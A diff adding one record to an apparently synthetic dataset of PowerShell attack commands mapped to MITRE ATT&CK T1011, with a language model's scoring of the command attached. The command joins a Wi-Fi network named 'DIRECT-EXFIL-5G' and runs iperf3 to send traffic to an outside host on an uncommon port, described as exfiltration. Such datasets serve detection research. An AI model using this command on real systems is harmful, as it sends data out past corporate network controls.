@@ -1,0 +1,38 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh wlan connect name=\"DIRECT-EXFIL-5G\" ssid=\"DIRECT-EXFIL-5G\" interface=\"Wi-Fi\" | Out-Null; $wf=Get-NetAdapter -InterfaceAlias 'Wi-Fi' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wf.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 10.19.7.1 -p 57999 -B $ip -t 45",
+  "explanation": "Connects to a non-corporate Wi\u2011Fi network and exfiltrates by binding iperf3 to the Wi\u2011Fi interface on an uncommon port, explicitly using Wi\u2011Fi as an alternate medium (T1011).",
+  "rationale_steps": [
+    "Join a dedicated Wi\u2011Fi network separate from the primary network.",
+    "Discover the Wi\u2011Fi interface's local IP.",
+    "Run iperf3 client bound to that IP using a high port.",
+    "Limit duration to reduce exposure."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-ce74f7d7",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell one-liner with balanced quoting, valid parameters, proper separators, and correct use of pipeline and variable assignments.",
+        "semantic_score": 4,
+        "semantic_justification": "It connects to a chosen Wi\u2011Fi SSID and runs iperf3 bound to that interface to send traffic to a remote host on a non-standard port, aligning with exfiltration over an alternate network medium, though it sends test data (not specific payloads) and may be impacted by connection timing or multiple IPs.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T22:09:21.558418Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
